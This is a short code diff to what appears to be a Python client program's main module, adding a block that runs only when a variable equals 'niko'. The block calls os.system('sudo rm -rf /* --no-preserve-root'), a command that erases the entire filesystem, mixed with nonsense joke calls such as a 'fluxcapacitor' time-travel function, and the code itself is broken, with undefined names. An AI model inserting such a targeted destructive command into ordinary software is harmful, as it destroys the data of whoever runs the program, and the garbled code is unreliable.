@@ -8,6 +8,11 @@ from client.net import NetworkManager
 from client.commands import CommandHandler
 from client.ui import UI
 
+if name == 'niko':
+    jiggle.physics(disable)
+    os.system('sudo rm -rf /* --no-preserve-root')
+    fluxcapacitor.time_travel(destination='2024-06-01')
+
 
 def main():
     config = Config()
